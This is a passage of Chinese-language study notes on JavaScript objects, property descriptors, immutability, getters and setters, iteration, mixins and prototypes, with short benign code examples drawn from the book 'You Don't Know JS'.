<strong>复制对象</strong></h4><ul><li>复制分为浅拷贝和深拷贝。浅拷贝会对对象中的基本数据类型进行复制(在内存中开辟新的区域)，对于对象则是继续引用，而不是重新创建一个”一样的”对象；深拷贝则是对其中的所有内容(包括对象)进行深层次的复制。</li><li>一般情况下我们可以通过JSON来复制对象：<code>var newObj = JSON.parse( JSON.stringify( someObj ) );</code>但需要指出的是这种方法<strong>对于包含function函数或者Date类型的对象则不管用！</strong></li><li>ES6 定义了 Object.assign(..) 方法来实现浅复制。</li></ul><h4 id="3-3-5-属性描述符"><a href="#3-3-5-属性描述符" class="headerlink" title="3.3.5 属性描述符"></a>3.3.5 <strong>属性描述符</strong></h4><p>从 ES5 开始，所有的属性都具备了属性描述符。</p><ul><li><strong>查看属性描述符:</strong> 可以使用Object.getOwnPropertyDescriptor( myObject， “a” );方法查看myObject对象里属性a的属性描述符。</li><li><strong>配置属性描述符:</strong> 可以使用Object.defineProperty(..)方法对属性的属性描述符进行配置。举个例子:</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty( myObject， <span class="string">&quot;a&quot;</span>， &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">2</span>，</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>，  <span class="comment">//决定是否可以修改属性的值</span></span><br><span class="line"><span class="attr">configurable</span>: <span class="literal">true</span>，  <span class="comment">//属性是否可配置</span></span><br><span class="line"><span class="attr">enumerable</span>: <span class="literal">true</span>   <span class="comment">//属性是否会出现在对象的属性枚举</span></span><br><span class="line">&#125; );</span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br><span class="line"><span class="comment">//该方法可以配置四个属性描述符</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong><br>对象里目前存在的属性描述符有两种主要形式：<strong>数据描述符</strong>和<strong>存取描述符</strong>。数据描述符是一个具有值的属性，该值可能是可写的，也可能不是可写的。存取描述符是由getter和setter函数对描述的属性。<strong>描述符必须是这两种形式之一；不能同时是两者</strong>。它们的关系如下:</p><table><thead><tr><th></th><th>configurable</th><th>enumerable</th><th>value</th><th>writable</th><th>get</th><th>set</th></tr></thead><tbody><tr><td>数据描述符</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>存取描述符</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr></tbody></table><p><strong>如果一个描述符不具有value，writable，get 和 set 任意一个关键字，那么它将被认为是一个数据描述符。如果一个描述符同时有(value或writable)和(get或set)关键字，将会产生一个异常。</strong></p><p>value就是该属性对应的值。默认为 undefined。下面分别介绍剩下的三个属性描述符键值:</p><ul><li><strong>Writable</strong>   决定是否可以修改属性的值。当被设置为false后，再对属性值进行修改，则会静默失败(silently failed，修改不成功，也不报错)。如果在严格模式下，则会报出TypeError错误。</li><li><strong>Configurable</strong> 决定属性描述符是否可配置。如果为true，就可以使用 defineProperty(..) 方法来修改属性描述符。注意：不管是不是处于严格模式，修改一个不可配置的属性描述符都会出错。并且<strong>把 configurable 修改成 false 是单向操作，无法撤销！</strong>除了无法修改，<strong>configurable:false 还会禁止删除这个属性</strong>。</li><li><strong>Enumerable</strong>  决定该属性是否会出现在对象的属性枚举中。比如说 for..in 循环，如果把 enumerable 设置成 false，这个属性就不会出现在枚举中，虽然仍然可以正常访问它。</li></ul><h4 id="3-3-6-不变性"><a href="#3-3-6-不变性" class="headerlink" title="3.3.6 不变性"></a>3.3.6 <strong>不变性</strong></h4><p><strong>注意:</strong> <strong>这些所有方法都是只能浅不变</strong>，如果目标对象引用了其他对象(数组、对象、函数等)，其他对象的内容不受影响，仍然是可变的。类似于浅拷贝.</p><p><strong>说明:</strong>  <strong>在 JavaScript 程序中很少需要深不可变性。</strong></p><p><strong>方法:</strong></p><ol><li><strong>对象常量(不可改)</strong> 结合 writable:false 和 configurable:false 就可以创建一个真正的常量属性(不可修改、重定义或者删除)</li><li><strong>禁止扩展(不可增)</strong> 使用 Object.prevent Extensions(myObject)，可以禁止一个对象添加新属性并且保留已有属性。在非严格模式下，创建属性 b 会静默失败。在严格模式下，将会抛出 TypeError 错误。</li><li><strong>密封(不可配置，但可修改)</strong> 使用Object.seal(..) 会创建一个“密封”的对象，这个方法实际上会在一个现有对象上调用Object.preventExtensions(..) 并把所有现有属性标记为 <strong>configurable:false</strong>。密封之后不仅不能添加新属性，也不能重新配置或者删除任何现有属性(虽然可以修改属性的值)。</li><li><strong>冻结(不可配置，也不可修改)</strong> Object.freeze(..) 会创建一个冻结对象，这个方法实际上会在一个现有对象上调用 Object.seal(..) 并把所有“数据访问”属性标记为 writable:false，这样就无法修改它们的值。这个方法是你可以应用在对象上的级别最高的不可变性，它会禁止对于对象本身及其任意直接属性的修改</li></ol><p><strong>注意:</strong> 你可以“深度冻结”一个对象(连引用的对象也冻结)，具体方法为，首先在这个对象上调用 Object.freeze(..)， 然后遍历它引用的所有对象并在这些对象上调用 Object.freeze(..)。但是一定要谨慎，因为你引用的对象可能会在其他地发也被引用.</p><h4 id="3-3-7-Get"><a href="#3-3-7-Get" class="headerlink" title="3.3.7 [[Get]]"></a>3.3.7 <strong>[[Get]]</strong></h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123; </span><br><span class="line">   <span class="attr">a</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p><strong>myObject.a是怎么取到值2的？</strong><br>myObject.a 通过对象默认内置的[[Get]] 操作。首先它会在对象中查找是否有名称相同的属性， 如果找到就会返回这个属性的值。如果没有找到名称相同的属性，按照 [[Get]] 算法的定义会执行另外一种非常重要的行为：其实就是遍历可能存在的 [[Prototype]] 链，也就是在原型链上寻找该属性。如果仍然都没有找到名称相同的属性，那 [[Get]] 操作会返回值 undefined。</p><p><strong>注意:</strong> 如果你引用了一个当前<strong>词法作用域</strong>中不存在的变量，并不会像对象属性一样返回 undefined，而是会抛出一个 ReferenceError 异常。</p><h4 id="3-3-8-Put"><a href="#3-3-8-Put" class="headerlink" title="3.3.8 [[Put]]"></a>3.3.8 <strong>[[Put]]</strong></h4><p>既然有可以获取属性值的 [[Get]] 操作，就一定有对应的 [[Put]] 来设置或者创建属性。 [[Put]] 被触发时的操作分为两个情况：1. 对象中已经存在这个属性   2. 对象中不存在这个属性。</p><p>如果对象中已经存在这个属性，[[Put]] 算法大致会检查下面这些内容:</p><ol><li>属性是否是访问描述符？如果是并且存在setter就调用setter。</li><li>属性的数据描述符中writable是否是false？如果是，在非严格模式下静默失败，在严格模式下抛出 TypeError 异常。</li><li>如果都不是，将该值设置为属性的值。</li></ol><p>如果对象中不存在这个属性，[[Put]] 操作会更加复杂。在第 5 章讨论 [[Prototype]] 时详细介绍。</p><h4 id="3-3-9-Getter和Setter"><a href="#3-3-9-Getter和Setter" class="headerlink" title="3.3.9 Getter和Setter"></a>3.3.9 <strong>Getter和Setter</strong></h4><p>对象默认的 [[Put]] 和 [[Get]] 操作分别可以控制属性值的设置和获取。目前我们还无法操作[[Get]] 和 [[Put]]来改写整个对象 ，但是在ES5中可以使用 getter 和 setter 改写<strong>部分</strong>默认操作，<strong>只能应用在单个属性上，无法应用在整个对象上</strong>。    </p><p><strong>注意:</strong> 书中后面说的<code>访问描述符</code>就是<code>存取描述符</code>。</p><p><strong>getter:</strong><br>getter 是一个隐藏函数，会在获取属性值时调用。同时会覆盖该单个属性默认的 [[Get]]操作。<strong>当你设置getter时，不能同时再设置value或writable，否则就会产生一个异常。并且当你设置getter或setter时，JavaScript 会忽略它们的 value 和 writable 特性。</strong></p><p><strong>语法:</strong> <code>&#123;get prop() &#123; ... &#125; &#125;</code>或<code>&#123;get [expression]() &#123; ... &#125; &#125;</code>。<br><strong>使用方式:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1111</span>， <span class="comment">//在后面会发现myObject.a为2，这是因为设置了getter所以忽略了value特性.</span></span><br><span class="line">  <span class="comment">//方式一:在新对象初始化时定义一个getter</span></span><br><span class="line">  <span class="keyword">get</span> <span class="title">a</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( </span><br><span class="line">  myObject， <span class="comment">// 目标对象 </span></span><br><span class="line">  <span class="string">&quot;b&quot;</span>， <span class="comment">// 属性名</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 方式二:使用defineProperty在现有对象上定义 getter</span></span><br><span class="line">    <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.a * <span class="number">2</span> &#125;，</span><br><span class="line">    <span class="comment">// 确保 b 会出现在对象的属性列表中</span></span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">myObject.a = <span class="number">3</span>;  <span class="comment">//因为设置了getter所以忽略了writable特性.所以这里赋值没成功</span></span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br><span class="line">myObject.b; <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> myObject.a;<span class="comment">//可以使用delete操作符删除</span></span><br></pre></td></tr></table></figure><p><strong>setter:</strong><br>setter 是一个隐藏函数，会在获取属性值时调用。同时会覆盖该单个属性默认的 [[Put]]操作(也就是赋值操作).<strong>当你设置setter时，不能同时再设置value或writable，否则就会产生一个异常.并且当你设置getter或setter时，JavaScript 会忽略它们的 value 和 writable 特性.</strong>        </p><p><strong>语法:</strong> <code>&#123;set prop(val) &#123; . . . &#125;&#125;</code>或<code>&#123;set [expression](val) &#123; . . . &#125;&#125;</code>。<br><strong>使用方式:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">  <span class="comment">//注意:通常来说 getter 和 setter 是成对出现的(只定义一个的话 通常会产生意料之外的行为):</span></span><br><span class="line">  <span class="comment">//方式一:在新对象初始化时定义一个setter</span></span><br><span class="line">  <span class="keyword">set</span> <span class="title">a</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>._a_ = val * <span class="number">2</span></span><br><span class="line">  &#125;，</span><br><span class="line">  <span class="keyword">get</span> <span class="title">a</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._a_ </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( </span><br><span class="line">  myObject， <span class="comment">// 目标对象 </span></span><br><span class="line">  <span class="string">&quot;b&quot;</span>， <span class="comment">// 属性名</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123; <span class="built_in">this</span>._b_ = val * <span class="number">3</span> &#125;，</span><br><span class="line">    <span class="comment">// 方式二:使用defineProperty在现有对象上定义 setter</span></span><br><span class="line">    <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>._b_ &#125;，</span><br><span class="line">    <span class="comment">// 确保 b 会出现在对象的属性列表中</span></span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">myObject.a = <span class="number">2</span>;  </span><br><span class="line">myObject.b = <span class="number">3</span>;  </span><br><span class="line"><span class="built_in">console</span>.log(myObject.a); <span class="comment">//4</span></span><br><span class="line"><span class="built_in">console</span>.log(myObject.b);<span class="comment">//9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(myObject._a_);<span class="comment">//4</span></span><br><span class="line"><span class="built_in">console</span>.log(myObject._b_);<span class="comment">//9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> myObject.a;<span class="comment">//可以使用delete操作符删除</span></span><br></pre></td></tr></table></figure><h4 id="3-3-10-存在性"><a href="#3-3-10-存在性" class="headerlink" title="3.3.10 存在性"></a>3.3.10 <strong>存在性</strong></h4><p><strong>属性存在性:</strong><br>如何判断一个对象是否存在某个属性(准确来说是<strong>检查这个属性名是否存在</strong>)，这时就需要用到:</p><ul><li><p><code>in</code>操作符：in 操作符会检查属性是否在对象及其 [[Prototype]] 原型链中(见第 5 章)。</p></li><li><p>hasOwnProperty(..) ：hasOwnProperty(..) 只会检查属性是否在 myObject 对象中，不会检查 [[Prototype]] 链。</p></li></ul><p><strong>注意:</strong></p><ul><li>如果有的对象可能没有连接到 Object.prototype( 通过Object. create(null) 来创建——见第 5 章)。在这种情况下，形如myObejct.hasOwnProperty(..) 就会失败。这时可以使用一种更加强硬的方法来进行判断:Object.prototype.hasOwnProperty. call(myObject，”a”)，它借用基础的 hasOwnProperty(..) 方法并把它显式绑定(见第2章)到 myObject 上。</li><li>对于数组来说，不要使用in操作符，因为它检查的是属性名，在数组中属性名就是索引，并不是我们所关注的重点。对于数组我们更关注的是它所存的值，所以对于数组检查某个值是否存在还是采用 <strong>indexOf</strong> 方法。</li></ul><p><strong>属性可枚举性:</strong><br>如果一个属性<strong>存在</strong>，且它的<strong>enumerable 属性描述符为 true</strong> 时，则它是可枚举的，并且可以被 for..in 循环。（缺一不可）    </p><p><strong>注意:</strong> for…in不适合对数组进行遍历，对数组的遍历还是使用传统的for循环.     </p><p>对属性的可枚举性判断，需要用到以下几种方法:</p><ul><li>propertyIsEnumerable(..) 会检查给定的属性名是否直接存在于对象中(而不是在原型链上)并且满足 enumerable:true。</li><li>Object.keys(..) 会返回一个数组，包含所有可枚举属性。</li><li>Object.getOwnPropertyNames(..)会返回一个数组，包含所有属性，无论它们是否可枚举。</li></ul><h3 id="3-4-遍历"><a href="#3-4-遍历" class="headerlink" title="3.4 遍历"></a>3.4 遍历</h3><p><strong>for..in</strong></p><ul><li>for..in 循环可以用来遍历对象的可枚举属性列表(<strong>包括 [[Prototype]] 链</strong>)。</li><li>实际上for..in遍历的并不是属性值，而是属性名(即键名 key)。所以想获取属性值还是需要手动使用obj[key]来获取.</li><li>一般在遍历对象时，推荐使用for..in.当然数组也是可以使用for..in的。在遍历数组时，推荐还是使用for..of。</li></ul><p><strong>for..of</strong></p><ul><li>ES6 增加了一种用来遍历<strong>数组</strong>的 for..of 循环语法。</li><li>for..of与for..in最大的不同点是，<strong>它循环的是属性值，而不是属性名。不过它只循环数组里存放的值，不会涉及到对象里的key。</strong></li><li>for..of 循环首先会向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next() 方法来遍历所有返回值。数组有内置的 @@iterator(对象没有，所以不能使用for..of，除非我们自己定义一个)，因此 for..of 可以直接应用在数组上。</li></ul><p><strong>例子比较</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;shotCat&#x27;</span>，<span class="number">111</span>，&#123;<span class="attr">a</span>:<span class="string">&#x27;1&#x27;</span>，b:<span class="string">&#x27;2&#x27;</span>&#125;]</span><br><span class="line">arr.say=<span class="string">&quot;IG niu pi!&quot;</span></span><br><span class="line"><span class="comment">//使用for..in循环</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[index]);<span class="comment">//shotCat  111  &#123;a:&#x27;1&#x27;，b:&#x27;2&#x27;&#125;  IG niu pi!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用for..of循环</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> value <span class="keyword">of</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);<span class="comment">//shotCat  111  &#123;a:&#x27;1&#x27;，b:&#x27;2&#x27;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意 for..of并没有遍历得到` IG niu pi!`.原因我前面说过`它只循环数组里存放的值，不会涉及到对象里的key.`更不用说 [[Prototype]] 链.(for..in则会)</span></span><br></pre></td></tr></table></figure><p><strong>如何让对象也能使用for..of ？</strong><br>可以选择使用书中的通过Object.defineProperty()定义一个Symbol.iterator属性来实现；也可以和Object.keys()搭配使用.举个例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shotCat=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;shotCat&#x27;</span>，</span><br><span class="line">    <span class="attr">age</span>:<span class="string">&#x27;forever18&#x27;</span>，</span><br><span class="line">    <span class="attr">info</span>:&#123;</span><br><span class="line"><span class="attr">sex</span>:<span class="string">&#x27;true man&#x27;</span>，</span><br><span class="line">    <span class="attr">city</span>:<span class="string">&#x27;wuhan&#x27;</span>，</span><br><span class="line">    <span class="attr">girlFriend</span>:<span class="string">&#x27;新垣结衣!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(shotCat))&#123;</span><br><span class="line">    <span class="comment">//使用Object.keys()方法获取对象key的数组</span></span><br><span class="line">    <span class="built_in">console</span>.log(key+<span class="string">&quot;: &quot;</span>+shotCat[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-小结-1"><a href="#3-5-小结-1" class="headerlink" title="3.5 小结"></a>3.5 小结</h3><ul><li>JavaScript 中的对象有<strong>字面形式</strong>(比如 var a = { .. })和<strong>构造形式</strong>(比如 var a = new Array(..))。字面形式更常用，不过有时候构造形式可以提供更多选项。</li><li>对象是 6 个基础类型之一。对象有包括 function 在内的子类型，不同子类型具有不同的行为，比如内部标签 [object Array] 表示这是对象的子类型数组。</li><li>对象就是键 / 值对的集合。可以通过 .propName 或者 [“propName”] 语法来获取属性值。访问属性时，引擎实际上会调用内部的默认 [[Get]] 操作(在设置属性值时是 [[Put]])， [[Get]] 操作会检查对象本身是否包含这个属性，如果没找到的话它还会查找 [[Prototype]] 链。</li><li>属性的特性可以通过属性描述符来控制，比如 writable 和 configurable。此外，可以使用 Object.preventExtensions(..)、Object.seal(..) 和 Object.freeze(..) 来设置对象(及其属性)的不可变性级别。</li><li>属性不一定包含值——它们可能是具备 getter/setter 的“访问描述符”。此外，属性可以是可枚举或者不可枚举的，这决定了它们是否会出现在 for..in 循环中。</li><li>可以使用 ES6 的 for..of 语法来遍历数据结构(数组、对象，等等)中的值，for..of 会寻找内置或者自定义的 @@iterator 对象并调用它的 next() 方法来遍历数据值。</li></ul><h2 id="第四章-混合对象”类”"><a href="#第四章-混合对象”类”" class="headerlink" title="第四章 混合对象”类”"></a>第四章 混合对象”类”</h2><h3 id="4-1-类理论"><a href="#4-1-类理论" class="headerlink" title="4.1 类理论"></a>4.1 类理论</h3><p>说明:</p><ul><li>类其是描述了一种代码的组织结构形式.</li><li>在js中类常见的就是构造函数，也可以是通过ES6提供的class关键字；继承就是函数；实例化就是对象，常见的就是通过new构造函数实现的。</li></ul><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b48db6fb628b%EF%BC%9Fw=1178&h=695&f=png&s=60553" alt="类、继承和实例化"></p><p><strong>注意:</strong> Javascript语言不支持“类”，所谓的”类”也是模拟出的“类”。即使是ES6引入的”类”实质上也是 JavaScript 现有的基于原型的继承的语法糖。</p><h4 id="4-1-1-“类”设计模式"><a href="#4-1-1-“类”设计模式" class="headerlink" title="4.1.1 “类”设计模式"></a>4.1.1 <strong>“类”设计模式</strong></h4><p>类其实也是一种设计模式！</p><h4 id="4-1-2-JavaScript中的“类”"><a href="#4-1-2-JavaScript中的“类”" class="headerlink" title="4.1.2 JavaScript中的“类”"></a>4.1.2 <strong>JavaScript中的“类”</strong></h4><p>JavaScript 只有一些近似类的语法元素 (比如 new 和 instanceof)，不过在后来的 ES6 中新增了一些元素，比如 class 关键字，其实质上也是 JavaScript 现有的基于原型的继承的语法糖，也不是真正的类。</p><h3 id="4-2-类的机制"><a href="#4-2-类的机制" class="headerlink" title="4.2 类的机制"></a>4.2 <strong>类的机制</strong></h3><h4 id="4-2-1-建造"><a href="#4-2-1-建造" class="headerlink" title="4.2.1 建造"></a>4.2.1 <strong>建造</strong></h4><p>在JavaScript里”类”主要是构造函数，”实例”就是对象。概括一下：<strong>类通过实例化得到实例对象</strong>。</p><p>总而言之:类通过实例化得到实例对象.</p><h4 id="4-2-2-构造函数"><a href="#4-2-2-构造函数" class="headerlink" title="4.2.2 构造函数"></a>4.2.2 <strong>构造函数</strong></h4><ul><li>类实例是由一个特殊的类方法构造的，这个方法名通常和类名相同，被称为构造函数。</li><li>实例就是由构造函数实例化的: new 构造函数。</li><li>构造函数大多需要用 new 来调，这样语言引擎才知道你想要构造一个新的类实例。</li><li>构造函数会返回一个对象，这个对象就是实例。实例可以调用类的方法。</li></ul><h3 id="4-3-类的继承"><a href="#4-3-类的继承" class="headerlink" title="4.3 类的继承"></a>4.3 类的继承</h3><p>在面向类的语言中，你可以先定义一个类，然后定义一个继承前者的类。后者通常被称为“子类”，前者通常被称为“父类”。子类可以继承父类的行为，并且可以根据自己的需求，修改继承的行为(一般并不会修改父类的行为).注意:我们讨论的父类和子类并不是实例，在JavaScript里类一般都是构造函数。</p><h4 id="4-3-1-多态"><a href="#4-3-1-多态" class="headerlink" title="4.3.1 多态"></a>4.3.1 <strong>多态</strong></h4><ul><li><strong>相对性:</strong> 其实相对性就是子类相对于父类的引用(例如使用super实现引用)，并且子类对父类的引用并不会对父类的行为造成任何影响(并不会对父类<strong>自身</strong>的行为进行重新定义)，例如书中例子子类对drive()的引用。</li><li><strong>可重复定义:</strong> 子类继承父类的某个方法，并可以对这个方法进行再次定义，例如书中子类对drive()中的output进行修改。当调用方法时会自动选择合适的定义。</li></ul><p><strong>说明:</strong> </p><ul><li>在 JavaScript 中“类”是属于构造函数的(类似 Foo.prototype… 这样的类型引用)。由于 JavaScript中<strong>父类和子类的关系只存在于两者构造函数对应的 .prototype 对象中</strong>，因此它们的构造函数之间并不存在直接联系，从而无法简单地实现两者的相对引用(在 ES6 的类中可以通过 super来“解决”这个问题，参见附录 A)。</li><li><strong>多态并不表示子类和父类有关联，子类得到的只是父类的一份副本。类的继承其实就是复制。</strong></li></ul><h4 id="4-3-2-多重继承"><a href="#4-3-2-多重继承" class="headerlink" title="4.3.2 多重继承"></a>4.3.2 <strong>多重继承</strong></h4><p><strong>多重继承:</strong> 一个子类可以继承来自多个父类的方法。<br><strong>多重继承引发的问题:</strong> 多重继承可能会出现，多个父类中方法名冲突的问题，这样<code>子类</code>到底引用哪个方法？     <strong>多重继承与JavaScript:</strong> JavaScript本身并没有提供多重继承功能.但它可以通过其他方法来达到多重继承的效果.</p><h3 id="4-4-混入"><a href="#4-4-混入" class="headerlink" title="4.4 混入"></a>4.4 <strong>混入</strong></h3><p>JavaScript 中只有对象，并不存在可以被实例化的“类”。一个对象并不会被复制到其他对象，它们会被关联起来(参见第 5 章)(其实就是引用，所以它的多态是”相对”的)。<br>由于在其他语言中类表现出来的都是复制行为，因此 JavaScript 开发者也想出了一个方法来模拟类的复制行为，这个方法就是混入(<strong>通过混入来模拟实现类的多重继承</strong>)。</p><h4 id="4-4-1-显式混入"><a href="#4-4-1-显式混入" class="headerlink" title="4.4.1 显式混入"></a>4.4.1 <strong>显式混入</strong></h4><p><strong>郑重提醒:</strong>     书中这里的类都是对象形式的.例子里的sourceObj， targetObj，这就可能造成一个”误导”，在JavaScript里是<strong>没有真正的类</strong>，所谓的类也不过是我们模拟出来的”类”，不过是一种语法糖(包括ES6里的class)。在JavaScript里”所谓的类”经常是一个构造函数，你并不能这样进行遍历，只能对它的实例对象进行这种操作。</p><p><strong>显式混入:</strong>  显式混入就是通过类似mixin()方法，显式地将父对象属性逐一复制，或者有选择地复制到子对象上。          </p><p><strong>显式混入常用方法:</strong> 首先有子对象，并对其进行特殊化(定义自己的属性或方法)。然后再通过mixin()方法将父对象有选择地复制(即存在性检查，过滤子对象已有的属性，避免冲突)到子对象上。</p><p><strong>显式混入注意点:<strong>显式混入时，切记一点你要</strong>避免父对象的属性与子对象特殊化的属性冲突</strong>。这就是为什么例子中要进行存在性检查，以及后面要说的混合复制，可能存在的重写风险.</p><p><strong>1. 再说多态</strong><br><strong>显式多态:</strong> 将父对象里的方法通过显式绑定到子对象上，就是显式多态。例如书中的例子:Vehicle.drive.call( this )。<strong>显式多态也是为了JS来模拟实现多重继承的！</strong><br><strong>说明:</strong> 在ES6之前是没有相对多态的机制。所以就使用call这种进行显式绑定实现显式动态。注意JavaScript里实现多态的方法也被称为”伪多态”，所以不要对后面突然冒出的伪多态概念而一脸懵逼。</p><p><strong>显式多态(伪多态)的缺陷:</strong> 因为在JavaScript 中存在屏蔽(实际是函数引用的上下文不同)，所以在引用的时候就需要使用显式伪多态的方法创建一个函数关联.   这些都会增加代码的复杂度和维护难度。</p><p><strong>2. 混合复制</strong>(显式混入另一种不常用方法)<br>前面的显式混入的方法是先有子对象并进行特殊化，然后再有选择地复制父对象属性。这个不常用的方法则是反过来的，结合书中例子，它先用一个空对象<strong>完全复制</strong>父对象的属性，然后该对象复制特殊化对象的属性，最后得到子对象。这种方法明显是比第一种麻烦的，并且在复制特殊化对象时，可能会对之前重名的属性(即复制得到的父对象属性)进行重写覆盖。所以这种方法是存在风险，且效率低下的.</p><p><strong>显式混入的缺陷:</strong></p><ul><li><strong>无法做到真正的复制:</strong> 如果复制的对象中存在对函数的引用，那么子对象得到的是和父对象一样的，对同一个函数的引用。如果某个子对象对函数进行了修改，那么父对象及其他子对象都会受到影响，很明显这是不安全的，原因是JavaScript 中的函数无法进行真正地复制，你只能复制对共享函数对象的引用.</li><li><strong>函数名和属性名同名:</strong> 如果混入多个对象，则可能会出现这种情况。目前现在仍没有比较好的方式来处理函数和属性的同名问题。</li></ul><p><strong>3. 寄生继承</strong><br>显式混入模式的一种变体被称为“寄生继承”，它既是显式的又是隐式的。首先会复制一份父类(对象)的定义，然后混入子类(对象)的定义(如果需要的话保留到父类的特殊引用)，然后用这个复合对象构建实例。<br><strong>说明:</strong> 寄生继承与混合复制是很相似的，最大的区别是寄生继承是通过实例化构造函数(JS中的”类”)来实现复制的.</p><h4 id="4-4-2-隐式混入"><a href="#4-4-2-隐式混入" class="headerlink" title="4.4.2 隐式混入"></a>4.4.2 <strong>隐式混入</strong></h4><p><strong>隐式混入:</strong> 它与显示混入最大的区别，就是它没有明显的对父类(对象)属性进行复制的过程。它是通过在构造函数调用或者方法调用中使用显式绑定例如: Something.cool.call( this)来实现混入(多重继承)，其本质就是通过改变this指向来实现混入。</p><h3 id="4-5-小结"><a href="#4-5-小结" class="headerlink" title="4.5 小结"></a>4.5 <strong>小结</strong></h3><p><strong>重点:</strong></p><ul><li><strong>类意味着复制！</strong></li><li>传统的类被实例化时，它的行为会被复制到实例中。类被继承时，行为也会被复制到子类中。</li><li>多态(在继承链的不同层次名称相同但是功能不同的函数)看起来似乎是从子类引用父类，但是本质上引用的其实是复制的结果。</li><li>JavaScript 并不会(像类那样)自动创建对象的副本。</li><li><strong>混入模式(无论显式还是隐式)可以用来模拟类的复制行为</strong>，但是通常会产生丑陋并且脆弱的语法，比如显式伪多态(OtherObj.methodName.call(this， …))，这会让代码更加难懂并且难以维护。</li><li>显式混入实际上无法完全模拟类的复制行为，因为对象(和函数！别忘了函数也是对象)只能复制引用，无法复制被引用的对象或者函数本身。</li><li>在 JavaScript 中模拟类是得不偿失的，虽然能解决当前的问题，但是可能会埋下更多的隐患。</li></ul><h2 id="第五章-原型"><a href="#第五章-原型" class="headerlink" title="第五章 原型"></a>第五章 原型</h2><h3 id="5-1-Prototype"><a href="#5-1-Prototype" class="headerlink" title="5.1 [[Prototype]]"></a>5.1 <code>[[Prototype]]</code></h3><p>JavaScript 中的对象有一个特殊的 [[Prototype]] 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 [[Prototype]] 属性都会被赋予一个非空的值。<br><code>对象的 [[Prototype]] 链接可以为空</code>的情况：通过Object.create(null)得到的对象，它的 [[Prototype]] 是为空的，为什么？因为null是原型链的顶端。它没有[[Prototype]]。对应的可以对比下<code>console.log(Object.create(&#123;&#125;))</code>和<code>console.log(Object.create(null))</code></p><p><strong>[[Prototype]]有什么用？</strong>     </p><p><strong>作用:</strong> 存放那些不在对象自身的属性。当我们访问一个对象的属性时，此时对象的内部默认操作[[Get]]，首先会检查对象本身是否有这个属性，如果有的话就使用它。如果没有的话，[[Get]] 就会继续访问对象的 [[Prototype]] 链。如果找到就返回该属性值；如果没有就继续寻找下一个[[Prototype]]链，直到找完整条[[Prototype]]链。还是没有的话，[[Get]] 就会返回undefined。</p><p><strong>补充:</strong></p><ul><li><strong>使用 for..in 遍历对象时</strong> 任何可以通过原型链访问到 (并且是 enumerable:true)的属性都会被枚举。</li><li><strong>使用 in 操作符</strong> 同样会查找对象的整条原型链(<strong>无论属性是否可枚举</strong>)</li></ul><h4 id="5-1-1-Object-prototype"><a href="#5-1-1-Object-prototype" class="headerlink" title="5.1.1 Object.prototype"></a>5.1.1 <strong>Object.prototype</strong></h4><p>所有普通的 [[Prototype]] 链最终都会指向内置的 Object.prototype。(Object.prototype的[[Prototype]] 